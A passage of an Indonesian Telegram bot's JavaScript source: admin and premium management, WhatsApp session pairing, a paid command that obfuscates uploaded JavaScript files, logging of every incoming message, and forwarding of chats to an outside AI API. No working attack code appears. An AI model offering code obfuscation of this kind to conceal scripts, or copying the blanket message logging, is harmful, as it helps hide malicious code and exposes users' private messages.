            "­Юў┐­ЮЎќ­ЮЎБ ­ЮЎћ­ЮЎќ­ЮЎЦ!? ­ЮЎђ­ЮЎБ­ЮЎЕ­ЮЎџ ­ЮЎј­ЮЎъ­ЮЎќ­ЮЎЦ­ЮЎќ? ­ЮЎћ­ЮЎќ­ЮЎБ­ЮЎю ­Юўй­ЮЎъ­ЮЎе­ЮЎќ ­ЮЎѕ­ЮЎќ­ЮЎа­ЮЎџ ­ЮўЙ­ЮЎф­ЮЎб­ЮЎќ­ЮЎБ ­ЮЎі­ЮЎг­ЮЎБ­ЮЎџ­ЮЎД ­ЮЎѓ­ЮЎг!!Рюў­ЊѓИ",
            { parse_mode: "Markdown" }
        );
    }

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "­ЪЎѕ Missing input. Please provide a user ID. Example: /addadmin 6843967527.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "­ЪЎѕ ­ЮЌд­ЮЌ«­ЮЌ╣­ЮЌ«­ЮЌх ­ЮЌю­ЮЌ╗­ЮЌй­Юўѓ­ЮўЂ ­ЮЌќ­ЮЌ╝­ЮЌ║­ЮЌ║­ЮЌ«­ЮЌ╗­ЮЌ▒ ­ЮЌЋ­ЮЌ▓­ЮЌ┤­ЮЌ╝, ­ЮЌг­ЮЌ«­ЮЌ╗­ЮЌ┤ ­ЮЌ»­ЮЌ▓­ЮЌ╗­ЮЌ▓­ЮЌ┐ /­ЮЌ«­ЮЌ▒­ЮЌ▒­ЮЌ«­ЮЌ▒­ЮЌ║­ЮЌХ­ЮЌ╗ (­ЮЌХ­ЮЌ▒).");
    }

    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveAdminUsers();
        console.log(`${senderId} Added ${userId} To Admin`);
        bot.sendMessage(chatId, `­ЪћЦ ­ЮЌд­ЮЌ▓­ЮЌ╣­ЮЌ«­ЮЌ║­ЮЌ«­ЮўЂ ­ЮЌф­ЮЌ«­ЮЌх­ЮЌ«­ЮЌХ ­ЮЌЋ­ЮЌ«­ЮЌй­ЮЌ«­ЮЌИ ­ЮЌ▒­ЮЌ▓­ЮЌ╗­ЮЌ┤­ЮЌ«­ЮЌ╗ ­ЮЌю­ЮЌ▒ ${userId} ­ЮЌД­ЮЌ▓­ЮЌ╣­ЮЌ«­ЮЌх ­ЮЌа­ЮЌ▓­ЮЌ╗­ЮЌи­ЮЌ«­ЮЌ▒­ЮЌХ ­ЮЌћ­ЮЌ▒­ЮЌ║­ЮЌХ­ЮЌ╗`);
    } else {
        bot.sendMessage(chatId, `­ЪЎѕ ­ЮЌЋ­ЮЌ▓­ЮЌ┤­ЮЌ╝!? ­ЮЌЋ­ЮЌ╝­ЮЌ░­ЮЌ«­ЮЌх ­ЮЌХ­ЮЌ╗­ЮЌХ ${userId} ­ЮЌд­Юўѓ­ЮЌ▒­ЮЌ«­ЮЌх ­ЮЌЮ­ЮЌ«­ЮЌ▒­ЮЌХ ­ЮЌћ­ЮЌ▒­ЮЌ║­ЮЌХ­ЮЌ╗!.`);
    }
});

bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
if (shouldIgnoreMessage(msg)) return;
    
    if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "­ЪЎѕ ­ЮЌЋ­ЮЌ«­ЮЌ╗­ЮЌ┤­ЮЌИ­ЮЌ▓!?­ЮЌЪ­Юўѓ ­ЮЌд­ЮЌХ­ЮЌ«­ЮЌй­ЮЌ«?.");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "­ЪЎѕ ­ЮЌб­ЮЌХ ­ЮЌЏ­ЮЌХ­ЮўЂ­ЮЌ«­ЮЌ║!? ­ЮЌд­ЮЌ«­ЮЌ╣­ЮЌ«­ЮЌх ­ЮЌю­ЮЌ╗­ЮЌй­Юўѓ­ЮўЂ ­ЮЌг­ЮЌ«­ЮЌ╗­ЮЌ┤ ­ЮЌЋ­ЮЌ▓­ЮЌ╗­ЮЌ▓­ЮЌ┐ /­ЮЌ▒­ЮЌ▓­ЮЌ╣­ЮЌй­ЮЌ┐­ЮЌ▓­ЮЌ║ (­ЮЌХ­ЮЌ▒)");
    }

    const userId = parseInt(match[1]);

    if (isNaN(userId)) {
        return bot.sendMessage(chatId, "­ЪЎѕ ­ЮЌА­ЮЌ┤­ЮЌ▓­ЮўЂ­ЮЌХ­ЮЌИ ­ЮЌг­ЮЌ«­ЮЌ╗­ЮЌ┤ ­ЮЌЋ­ЮЌ▓­ЮЌ╗­ЮЌ▓­ЮЌ┐ ­ЮЌќ­ЮЌ╝­ЮЌИ!? ­ЮЌБ­ЮЌ«­ЮЌИ­ЮЌ▓ ­ЮЌћ­ЮЌ╗­ЮЌ┤­ЮЌИ­ЮЌ«");
    }

    
    const index = premiumUsers.findIndex(user => user.id === userId);
    if (index === -1) {
        return bot.sendMessage(chatId, `­ЪЎѕ ­ЮЌЋ­Юўѓ­ЮўЂ­ЮЌ╝ ­ЮЌю­ЮЌи­ЮЌ╝ ${userId} ­ЮЌ┤­ЮЌ«­ЮЌИ ­ЮўЂ­ЮЌ▓­ЮЌ┐­ЮЌ▒­ЮЌ«­ЮЌ│­ЮўЂ­ЮЌ«­ЮЌ┐ ­ЮЌ▒­ЮЌ«­ЮЌ╣­ЮЌ«­ЮЌ║ ­ЮЌй­ЮЌ┐­ЮЌ▓­ЮЌ║­ЮЌХ­Юўѓ­ЮЌ║`);
    }

    
    premiumUsers.splice(index, 1);
    savePremiumUsers();
    bot.sendMessage(chatId, `­ЪћЦ User ${userId} has been removed from the prem list.`);
});

bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
if (shouldIgnoreMessage(msg)) return;
    
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "­Юў┐­ЮЎќ­ЮЎБ ­ЮЎћ­ЮЎќ­ЮЎЦ!? ­ЮЎђ­ЮЎБ­ЮЎЕ­ЮЎџ ­ЮЎј­ЮЎъ­ЮЎќ­ЮЎЦ­ЮЎќ? ­ЮЎћ­ЮЎќ­ЮЎБ­ЮЎю ­Юўй­ЮЎъ­ЮЎе­ЮЎќ ­ЮЎѕ­ЮЎќ­ЮЎа­ЮЎџ ­ЮўЙ­ЮЎф­ЮЎб­ЮЎќ­ЮЎБ ­ЮЎі­ЮЎг­ЮЎБ­ЮЎџ­ЮЎД ­ЮЎѓ­ЮЎг!!Рюў­ЊѓИ",
            { parse_mode: "Markdown" }
        );
    }

   
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "­ЪЎѕ ­ЮЌд­ЮЌ«­ЮЌ╣­ЮЌ«­ЮЌх ­ЮЌъ­ЮЌХ­ЮЌ║­ЮЌ«­ЮЌИ!? ­ЮЌќ­ЮЌ╝­ЮЌ»­ЮЌ« ­ЮЌе­ЮЌ╣­ЮЌ«­ЮЌ╗­ЮЌ┤ ­ЮЌЪ­ЮЌ«­ЮЌ┤­ЮЌХ.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "­ЪЎѕ ­ЮЌБ­ЮЌ▓­ЮЌ╣­ЮЌ▓­ЮЌ┐ ­ЮЌа­ЮЌ▓­ЮЌ╣­ЮЌ«­ЮЌ┐!? ­ЮЌю­ЮЌ╗­ЮЌй­Юўѓ­ЮўЂ ­ЮЌА­Юўє­ЮЌ« ­ЮЌд­ЮЌ«­ЮЌ╣­ЮЌ«­ЮЌх ­ЮЌќ­ЮЌ╝­ЮЌ╗­ЮўЂ­ЮЌ╝­ЮЌх : /­ЮЌ▒­ЮЌ▓­ЮЌ╣­ЮЌ«­ЮЌ▒­ЮЌ║­ЮЌХ­ЮЌ╗ 60.");
    }

   
    const adminIndex = adminUsers.indexOf(userId);
    if (adminIndex !== -1) {
        adminUsers.splice(adminIndex, 1);
        saveAdminUsers();
        console.log(`${senderId} Removed ${userId} From Admin`);
        bot.sendMessage(chatId, `­ЪћЦ ­ЮЌќ­ЮЌХ­ЮЌ▓­ЮЌ▓ ­ЮЌЋ­ЮЌ▓­ЮЌх­ЮЌ«­Юўђ­ЮЌХ­ЮЌ╣ ­ЮЌа­ЮЌ▓­ЮЌ╗­ЮЌ┤­ЮЌх­ЮЌ«­ЮЌй­Юўѓ­Юўђ ${userId} ­ЮЌд­ЮЌ▓­ЮЌ»­ЮЌ«­ЮЌ┤­ЮЌ«­ЮЌХ ­ЮЌћ­ЮЌ▒­ЮЌ║­ЮЌХ­ЮЌ╗­Ъўј`);
    } else {
        bot.sendMessage(chatId, `­ЪЎѕ ­ЮЌб­ЮЌХ ­ЮЌъ­ЮЌХ­ЮЌ║­ЮЌ«­ЮЌИ!? ${userId} ­ЮЌЋ­Юўѓ­ЮЌИ­ЮЌ«­ЮЌ╗ ­ЮЌћ­ЮЌ▒­ЮЌ║­ЮЌХ­ЮЌ╗! .`);
    }
});

bot.onText(/\/listpair/, async (msg) => {
    const chatId = msg.chat.id;
    const activeSessions = await loadActiveSessions();   
if (shouldIgnoreMessage(msg)) return;
if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
  return bot.sendMessage(
    chatId,
    "­Юў┐­ЮЎќ­ЮЎБ ­ЮЎћ­ЮЎќ­ЮЎЦ!? ­ЮЎђ­ЮЎБ­ЮЎЕ­ЮЎџ ­ЮЎј­ЮЎъ­ЮЎќ­ЮЎЦ­ЮЎќ? ­ЮЎћ­ЮЎќ­ЮЎБ­ЮЎю ­Юўй­ЮЎъ­ЮЎе­ЮЎќ ­ЮЎѕ­ЮЎќ­ЮЎа­ЮЎџ ­ЮўЙ­ЮЎф­ЮЎб­ЮЎќ­ЮЎБ ­ЮЎі­ЮЎг­ЮЎБ­ЮЎџ­ЮЎД ­ЮЎѓ­ЮЎг!!Рюў­ЊѓИ",
    { parse_mode: "Markdown" }
  );
}
    if (activeSessions.length === 0) {
        bot.sendMessage(chatId, 'Рё╣№ИЈ Tidak ada sesi yang aktif saat ini.', { parse_mode: 'Markdown' });
    } else {
        const sessionList = activeSessions.map(session => `­ЪЉц${session}`).join('\n');
        const messageText = `
*Daftar Sesi Aktif:*

${sessionList}

РЂЅ№ИЈ  Untuk menghapus sesi, gunakan \`/delpair\`
р┤ё╩ђр┤Єр┤ђр┤Џр┤Є ╩Ў╩Ј р┤Јр┤Џр┤ђxРИЎ`;

        bot.sendMessage(chatId, messageText, { parse_mode: 'Markdown' });
    }
});
bot.onText(/\/delpair/, async (msg) => { // tambahkan 'async'
    const chatId = msg.chat.id;
    if (shouldIgnoreMessage(msg)) return;
    if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
  return bot.sendMessage(
    chatId,
    "­Юў┐­ЮЎќ­ЮЎБ ­ЮЎћ­ЮЎќ­ЮЎЦ!? ­ЮЎђ­ЮЎБ­ЮЎЕ­ЮЎџ ­ЮЎј­ЮЎъ­ЮЎќ­ЮЎЦ­ЮЎќ? ­ЮЎћ­ЮЎќ­ЮЎБ­ЮЎю ­Юўй­ЮЎъ­ЮЎе­ЮЎќ ­ЮЎѕ­ЮЎќ­ЮЎа­ЮЎџ ­ЮўЙ­ЮЎф­ЮЎб­ЮЎќ­ЮЎБ ­ЮЎі­ЮЎг­ЮЎБ­ЮЎџ­ЮЎД ­ЮЎѓ­ЮЎг!!Рюў­ЊѓИ",
    { parse_mode: "Markdown" }
  );
}
    await clearSessionDirectory(); // gunakan 'await'
    bot.sendMessage(chatId, 'Semua Sender Dan File Sessions Sudah Dihapus\nр┤ё╩ђр┤Єр┤ђр┤Џр┤Є ╩Ў╩Ј р┤Јр┤Џр┤ђxРИЎ');
});
bot.onText(/\/cekidch (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    
    const link = match[1];
    
    
    let result = await getWhatsAppChannelInfo(link);
if (shouldIgnoreMessage(msg)) return;
    if (result.error) {
        bot.sendMessage(chatId, `­Ъцг ${result.error}`);
    } else {
        let teks = `
 *Informasi Channel WhatsApp*
 *ID:* ${result.id}
 *Nama:* ${result.name}
 *Total Pengikut:* ${result.subscribers}
 *Status:* ${result.status}
 *Verified:* ${result.verified}
        `;
        bot.sendMessage(chatId, teks);
    }
});
bot.onText(/\/groupon/, async (msg) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
        if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "­Юў┐­ЮЎќ­ЮЎБ ­ЮЎћ­ЮЎќ­ЮЎЦ!? ­ЮЎђ­ЮЎБ­ЮЎЕ­ЮЎџ ­ЮЎј­ЮЎъ­ЮЎќ­ЮЎЦ­ЮЎќ? ­ЮЎћ­ЮЎќ­ЮЎБ­ЮЎю ­Юўй­ЮЎъ­ЮЎе­ЮЎќ ­ЮЎѕ­ЮЎќ­ЮЎа­ЮЎџ ­ЮўЙ­ЮЎф­ЮЎб­ЮЎќ­ЮЎБ ­ЮЎі­ЮЎг­ЮЎБ­ЮЎџ­ЮЎД ­ЮЎѓ­ЮЎг!!Рюў­ЊѓИ",
            { parse_mode: "Markdown" }
        );
    }

    try {
        setOnlyGroup(true); // Aktifkan mode hanya grup
        await bot.sendMessage(chatId, "РюЁ Mode hanya grup diaktifkan!");
    } catch (error) {
        console.error("Kesalahan saat mengaktifkan mode hanya grup:", error);
        await bot.sendMessage(chatId, "РЮї Terjadi kesalahan saat mengaktifkan mode hanya grup.");
    }
});
bot.onText(/\/info/, async (msg) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const username = msg.from.username;

    if (shouldIgnoreMessage(msg)) return;

    const repliedMessage = msg.reply_to_message;

    
    if (!repliedMessage) {
       
        const replyOptions = {
            reply_to_message_id: msg.message_id, 
            parse_mode: 'Markdown',              
        };
        try {
            await bot.sendMessage(
                chatId,
                `
РЋГРћЂРћЂсђї INFO KAMU сђЇРгБ
├Ќ═ю├Ќ Username: ${username ? `@${username}` : 'Tidak ada'}
├Ќ═ю├Ќ ID: \`${senderId}\`
РЋ░РћђРћђРћђРћђРћђРћђРћђРћђРћђРћђРћђРћђРћђРћђРћђРћђРгБ
`,
                replyOptions
            );
        } catch (error) {
            console.error("Error saat mengirim pesan:", error);
            await bot.sendMessage(chatId, "Рџа№ИЈ  Terjadi kesalahan saat memproses permintaan Anda.", { reply_to_message_id: msg.message_id, parse_mode: 'Markdown' });

        }
        return; 
    }

    const repliedUserId = repliedMessage.from?.id;

    if (!repliedMessage.from) {
        const errorMessage = "Рџа№ИЈ  Pesan yang Anda balas tidak memiliki informasi pengirim.";
        await bot.sendMessage(chatId, errorMessage, { parse_mode: 'Markdown', reply_to_message_id: msg.message_id });
        return;
    }

    if (!repliedUserId) {
        const errorMessage = "Рџа№ИЈ  Pesan yang Anda balas tidak memiliki ID pengguna.";
        await bot.sendMessage(chatId, errorMessage, { parse_mode: 'Markdown', reply_to_message_id: msg.message_id });
        return;
    }
    const repliedUsername = repliedMessage.from.username;
    const repliedFirstName = repliedMessage.from.first_name;
    const repliedLastName = repliedMessage.from.last_name;
    const repliedFullName = repliedFirstName + (repliedLastName ? ` ${repliedLastName}` : '');

    const replyOptions = {
        reply_to_message_id: msg.message_id,
        parse_mode: 'Markdown',
    };

    try {
        await bot.sendMessage(
            chatId,
            `
РЋГРћЂРћЂсђї INFO PENGGUNA сђЇРћЂРћЂРћЂРгБ
├Ќ═ю├Ќ Username: ${repliedUsername ? `@${repliedUsername}` : 'Tidak ada'}
├Ќ═ю├Ќ ID: \`${repliedUserId}\`
├Ќ═ю├Ќ Nama: \`${repliedFullName}\`
РЋ░РћђРћђРћђРћђРћђРћђРћђРћђРћђРћђРћђРћђРћђРћђРћђРћђРгБ
*Diminta oleh* [${username ? `@${username}` : 'Anda'}]`,
            replyOptions
        );
    } catch (error) {
        console.error("Error saat mengirim pesan:", error);
        await bot.sendMessage(chatId, "Рџа№ИЈ  Terjadi kesalahan saat memproses permintaan Anda.", { reply_to_message_id: msg.message_id, parse_mode: 'Markdown' });
    }
});
bot.onText(/\/otax (.+)/, (msg, match) => {
    const messageText = match[1]; 
    sendNotifOwner(msg, `Pesan dari pengguna: ${messageText}`)
      .then(() => {
        bot.sendMessage(msg.chat.id, '­ЮўЌ­Юўї­Юўџ­Юўѕ­ЮўЋ ­Юўѕ­ЮўЋ­ЮўІ­Юўѕ ­ЮўЏ­Юўї­ЮўЊ­Юўѕ­ЮўЈ ­ЮўІ­Юўљ­Юўњ­Юўљ­ЮўЎ­Юўљ­Юўћ ­Юўњ­Юўї ­Юўќ­ЮўЏ­Юўѕ ­Юўћ­Юўќ­ЮўЈ­Юўќ­ЮўЋ ­ЮўІ­Юўљ­ЮўЏ­Юўю­ЮўЋ­Юўј­Юўј­Юўю ­Юўџ­Юўї­ЮўЅ­Юўї­ЮўЋ­ЮўЏ­Юўѕ­ЮўЎ\nр┤ё╩ђр┤Єр┤ђр┤Џр┤Є ╩Ў╩Ј р┤Јр┤Џр┤ђxРИЎ');
      })
      .catch(() => {
        bot.sendMessage(msg.chat.id, '­ЮўЏ­Юўї­ЮўЎ­ЮўЉ­Юўѕ­ЮўІ­Юўљ ­Юўњ­Юўї­Юўџ­Юўѕ­ЮўЊ­Юўѕ­ЮўЈ­Юўѕ­ЮўЋ ­Юўџ­Юўѕ­Юўѕ­ЮўЏ ­Юўћ­Юўї­ЮўЋ­Юўј­Юўљ­ЮўЎ­Юўљ­Юўћ­Юўњ­Юўѕ­ЮўЋ ­ЮўЌ­Юўї­Юўџ­Юўѕ­ЮўЋ.\nр┤ё╩ђр┤Єр┤ђр┤Џр┤Є ╩Ў╩Ј р┤Јр┤Џр┤ђxРИЎ');
      });
});

bot.onText(/\/groupoff/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const delay = ms => new Promise(res => setTimeout(res, ms));
    
        if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "­Юў┐­ЮЎќ­ЮЎБ ­ЮЎћ­ЮЎќ­ЮЎЦ!? ­ЮЎђ­ЮЎБ­ЮЎЕ­ЮЎџ ­ЮЎј­ЮЎъ­ЮЎќ­ЮЎЦ­ЮЎќ? ­ЮЎћ­ЮЎќ­ЮЎБ­ЮЎю ­Юўй­ЮЎъ­ЮЎе­ЮЎќ ­ЮЎѕ­ЮЎќ­ЮЎа­ЮЎџ ­ЮўЙ­ЮЎф­ЮЎб­ЮЎќ­ЮЎБ ­ЮЎі­ЮЎг­ЮЎБ­ЮЎџ­ЮЎД ­ЮЎѓ­ЮЎг!!Рюў­ЊѓИ",
            { parse_mode: "Markdown" }
        );
    }

    try {
        setOnlyGroup(false); 
        await bot.sendMessage(chatId, "РюЁ Mode hanya grup dinonaktifkan!");
    } catch (error) {
        console.error("Kesalahan saat menonaktifkan mode hanya grup:", error);
        await bot.sendMessage(chatId, "РЮї Terjadi kesalahan saat menonaktifkan mode hanya grup.");
    }
});
// case enc
bot.onText(/\/encjava/, async (msg) => {
    const chatId = msg.chat.id;   
    const senderId = msg.from.id;
    const randomImage = getRandomImage(); 
    const userId = msg.from.id.toString();
     
     if (shouldIgnoreMessage(msg)) return;
    
if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`
( ! ) Silahkan AddPremium Sebelum Menggunakan /encjava
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "­Юўќ­ЮўИ­Юў»­Юўд­Юў│", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}

   
    if (!msg.reply_to_message || !msg.reply_to_message.document) {
        return bot.sendMessage(chatId, "­ЪЎѕ *Error:* Balas file .js dengan `/encjava`!", { parse_mode: "Markdown" });
    }

    const file = msg.reply_to_message.document;
    if (!file.file_name.endsWith(".js")) {
        return bot.sendMessage(chatId, "­ЪЎѕ *Error:* Hanya file .js yang didukung!", { parse_mode: "Markdown" });
    }

    const encryptedPath = path.join(__dirname, `OTAX-encrypted-${file.file_name}`);

    try {
        const progressMessage = await bot.sendMessage(chatId, "­Ъћњ Memulai proses enkripsi...");

        await updateProgress(bot, chatId, progressMessage, 10, "Mengunduh File");

        // **Perbaikan pengambilan file dari Telegram**
        const fileData = await bot.getFile(file.file_id);
        const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${fileData.file_path}`;
        const response = await axios.get(fileUrl, { responseType: "arraybuffer" });
        let fileContent = response.data.toString("utf-8");

        await updateProgress(bot, chatId, progressMessage, 20, "Mengunduh Selesai");

        
        try {
            new Function(fileContent);
        } catch (syntaxError) {
            throw new Error(`Kode awal tidak valid: ${syntaxError.message}`);
        }

        await updateProgress(bot, chatId, progressMessage, 40, "Inisialisasi Enkripsi");

        
        const obfuscated = await JsConfuser.obfuscate(fileContent, getAphocalypsObfuscationConfig());
        let obfuscatedCode = obfuscated.code || obfuscated;

        if (typeof obfuscatedCode !== "string") {
            throw new Error("Hasil obfuscation bukan string");
        }

       
        try {
            new Function(obfuscatedCode);
        } catch (postObfuscationError) {
            throw new Error(`Hasil obfuscation tidak valid: ${postObfuscationError.message}`);
        }

        await updateProgress(bot, chatId, progressMessage, 80, "Finalisasi Enkripsi");

        await fs.promises.writeFile(encryptedPath, obfuscatedCode);

        
        await bot.sendDocument(chatId, encryptedPath, {
            caption: "­ЪћЦ *File terenkripsi (OtaXxx Chaos Core) siap!*\n_┬ЕOtaXxx ENC_",
            parse_mode: "Markdown"
        });

        await updateProgress(bot, chatId, progressMessage, 100, "OtaXxx Chaos Core Selesai");

        
        try {
            await fs.promises.access(encryptedPath);
            await fs.promises.unlink(encryptedPath);
        } catch (err) {
            console.error("Gagal menghapus file:", err.message);
        }
    } catch (error) {
        await bot.sendMessage(chatId, `­ЪЎѕ *Kesalahan:* ${error.message || "Tidak diketahui"}\n_Coba lagi dengan kode Javascript yang valid!_`, { parse_mode: "Markdown" });

       
        try {
            await fs.promises.access(encryptedPath);
            await fs.promises.unlink(encryptedPath);
        } catch (err) {
            console.error("Gagal menghapus file:", err.message);
        }
    }
});
;
const historyDir = './chat_history';
async function ensureHistoryDir() {
    try {
        await fs.mkdir(historyDir, { recursive: true }); 
    } catch (error) {
        console.error("Error membuat direktori riwayat:", error);
    }
}


(async () => { 
    await ensureHistoryDir(); 
})();


const chatHistory = {}; 
async function saveHistoryToFile(chatId, history) {
  const filename = `${historyDir}/${chatId}.json`; 
    try {
        await fs.writeFile(filename, JSON.stringify(history, null, 2)); 
        
    } catch (error) {
        console.error("Error menyimpan riwayat ke file:", error);
    }
}


async function loadHistoryFromFile(chatId) {
    const filename = `${historyDir}/${chatId}.json`;
    try {
        const data = await fs.readFile(filename, 'utf8');
        return JSON.parse(data);
    } catch (error) {
        
        if (error.code === 'ENOENT') {
            
            return [];
        }
        console.error("Error memuat riwayat dari file:", error);
        return []; 
    }
}

async function generateAIResponse(text) {
    try {
        const hai = text;
        const response = await axios.get(`https://api.agatz.xyz/api/gptlogic?logic=Generate%20humanized%20chatgpt%20text%20in%20Indonesian,%20you%20are%20an%20AI%20assistant%20named%20GPT&p=${encodeURIComponent(text)}`);
        const data = response.data;
      

        if (data && data.data && "result" in data.data) {
            return `${data.data.result}`;
        } else {
            console.error("Error: No 'result' key found in the response:", data);
            return "РЮї Tidak ada hasil dari API."; 
        }
    } catch (error) {
        console.error("Error fetching or processing AI response:", error);
        if (error.response) {
                console.error("Response data:", error.response.data);
                console.error("Response status:", error.response.status);
                console.error("Response headers:", error.response.headers);
                return  `РЮї Terjadi kesalahan pada saat menghubungi API. Status: ${error.response.status}`;
            } else if (error.request) {
                console.error("No response received:", error.request);
                return "РЮї Tidak ada respon dari server.";
            } else {
                console.error("Error during request setup:", error.message);
                return `РЮї Terjadi kesalahan: ${error.message}`;
            }
    }
}


bot.onText(/\/on/, (msg) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id; 
    if (shouldIgnoreMessage(msg)) return;
        if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "­Юў┐­ЮЎќ­ЮЎБ ­ЮЎћ­ЮЎќ­ЮЎЦ!? ­ЮЎђ­ЮЎБ­ЮЎЕ­ЮЎџ ­ЮЎј­ЮЎъ­ЮЎќ­ЮЎЦ­ЮЎќ? ­ЮЎћ­ЮЎќ­ЮЎБ­ЮЎю ­Юўй­ЮЎъ­ЮЎе­ЮЎќ ­ЮЎѕ­ЮЎќ­ЮЎа­ЮЎџ ­ЮўЙ­ЮЎф­ЮЎб­ЮЎќ­ЮЎБ ­ЮЎі­ЮЎг­ЮЎБ­ЮЎџ­ЮЎД ­ЮЎѓ­ЮЎг!!Рюў­ЊѓИ",
            { parse_mode: "Markdown" }
        );
    }
    aiEnabled = true;
    bot.sendMessage(chatId, '­ЪцќOTAX diaktifkan.', { parse_mode: 'Markdown' });
});

bot.onText(/\/off/, (msg) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id
    if (shouldIgnoreMessage(msg)) return;
        if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "­Юў┐­ЮЎќ­ЮЎБ ­ЮЎћ­ЮЎќ­ЮЎЦ!? ­ЮЎђ­ЮЎБ­ЮЎЕ­ЮЎџ ­ЮЎј­ЮЎъ­ЮЎќ­ЮЎЦ­ЮЎќ? ­ЮЎћ­ЮЎќ­ЮЎБ­ЮЎю ­Юўй­ЮЎъ­ЮЎе­ЮЎќ ­ЮЎѕ­ЮЎќ­ЮЎа­ЮЎџ ­ЮўЙ­ЮЎф­ЮЎб­ЮЎќ­ЮЎБ ­ЮЎі­ЮЎг­ЮЎБ­ЮЎџ­ЮЎД ­ЮЎѓ­ЮЎг!!Рюў­ЊѓИ",
            { parse_mode: "Markdown" }
        );
    }
    
    aiEnabled = false;
    bot.sendMessage(chatId, '­ЪцќOTAX dinonaktifkan.', { parse_mode: 'Markdown' });
});


async function logMessageToFile(msg) {
  try {
    const logFilePath = 'pesan_masuk.log'; 
    const timestamp = new Date().toISOString();
    const logEntry = `${timestamp} - ${JSON.stringify(msg)}\n`; 
    await fs.appendFile(logFilePath, logEntry); 
  } catch (error) {
    console.error('Error menulis ke file log:', error);
  }
}

let aiEnabled = false; 


bot.on('message', async (msg) => {
    logMessageToFile(msg);

    const chatId = msg.chat.id;
    const text = msg.text;

    if (!text) return; 
    if (!aiEnabled) return; 

    
    const chatType = msg.chat.type;

    
    if (chatType === 'private' || chatType === 'group' || chatType === 'supergroup') {

        try {
            bot.sendChatAction(chatId, 'typing');
            const responseText = await generateAIResponse(text); 

            
            bot.sendMessage(chatId, responseText, {
                parse_mode: 'HTML',
                reply_to_message_id: msg.message_id  
            });


        } catch (error) {
            console.error("Error in AI response:", error);
            
            bot.sendMessage(chatId, `РЮї Terjadi kesalahan: ${error.message}`, {
                parse_mode: 'HTML',
                reply_to_message_id: msg.message_id
            });
        }
    }
});
const welcomeMessages = {};
const goodbyeMessages = {};
let welcomeEnabled = true;
let goodbyeEnabled = true;

const adminList = {}; 

async function sendGoodbyeMessage(chatId, member) {
          
          if (!goodbyeEnabled) {
              
              return;  
          }
          
          const customGoodbyeMessage = goodbyeMessages[chatId] || 'Sampai jumpa!'; 
          const username = member.username ? `@${member.username}` : member.first_name;
          const goodbyeText = customGoodbyeMessage.replace('{username}', username);
          try {
                await bot.sendMessage(chatId, goodbyeText, { parse_mode: 'Markdown' });
                
            } catch (error) {
                console.error('Error mengirim pesan perpisahan:', error);
            }
        }
bot.onText(/^\/setwelcome (.+)$/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    if (shouldIgnoreMessage(msg)) return;
    if (!isOwner(userId) && !(await isAdmin(chatId, userId))) {
       return bot.sendMessage(chatId, "Рџа№ИЈ  Maaf, Anda harus menjadi owner atau admin untuk mengubah pesan selamat datang.", { parse_mode: "Markdown", reply_to_message_id: msg.message_id }); // Membalas
    }
  
    const newWelcomeMessage = match[1];  
    if (!newWelcomeMessage) {
          return bot.sendMessage(chatId, "Рџа№ИЈ  Silakan berikan pesan selamat datang setelah perintah /setwelcome.",  { parse_mode: 'Markdown', reply_to_message_id: msg.message_id }); 
    }
   
    welcomeMessages[chatId] = newWelcomeMessage;
    bot.sendMessage(chatId, "РюЁ Pesan selamat datang berhasil diatur.", { parse_mode: 'Markdown', reply_to_message_id: msg.message_id }); 
});

bot.onText(/^\/setgoodbye (.+)$/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
if (shouldIgnoreMessage(msg)) return;
    if (!isOwner(userId) && !(await isAdmin(chatId, userId))) {
       return bot.sendMessage(chatId, "Рџа№ИЈ  Maaf, Anda harus menjadi owner atau admin untuk mengubah pesan perpisahan.", { parse_mode: "Markdown", reply_to_message_id: msg.message_id }); 
    }
    const newGoodbyeMessage = match[1];  
    if (!newGoodbyeMessage) {
          return bot.sendMessage(chatId, "Рџа№ИЈ  Silakan berikan pesan perpisahan setelah perintah /setgoodbye.",  { parse_mode: 'Markdown', reply_to_message_id: msg.message_id }); // Membalas
    }
    
    goodbyeMessages[chatId] = newGoodbyeMessage;
    bot.sendMessage(chatId, "РюЁ Pesan perpisahan berhasil diatur.", { parse_mode: 'Markdown', reply_to_message_id: msg.message_id }); 
});


bot.onText(/^\/welcomeon$/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
if (shouldIgnoreMessage(msg)) return;
    if (!isOwner(userId) && !(await isAdmin(chatId, userId))) {
